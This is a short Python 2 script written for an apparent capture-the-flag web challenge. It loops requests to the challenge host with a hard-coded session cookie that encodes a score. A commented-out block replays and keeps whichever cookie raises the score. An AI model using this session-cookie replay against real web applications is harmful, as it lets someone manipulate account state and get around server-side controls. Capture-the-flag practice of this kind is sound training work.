import requests


url="http://79gq4l5zpv1aogjgw6yhhymi4.ctf.p0wnhub.com/?p="



rep=requests.get(url+"hi")
score=int(rep.text.split()[9])
cookiess={'session':'eyJzY29yZSI6MTAwfQ.XpKTEg.9WcaUAbRYLAXVfC_eWFddTdnkjA'}
i=0
while True:
	print i,score
	rep=requests.get(url+'hi',cookies=cookiess)
	"""
	new_score=int(rep.text.split()[9])
	new_cookie=rep.cookies['session']
	if new_score >score:
		cookiess['session']=new_cookie
		score=new_score
	print rep.text
	print "COOKIE",cookiess['session']
	i+=1
	"""
	print rep.text





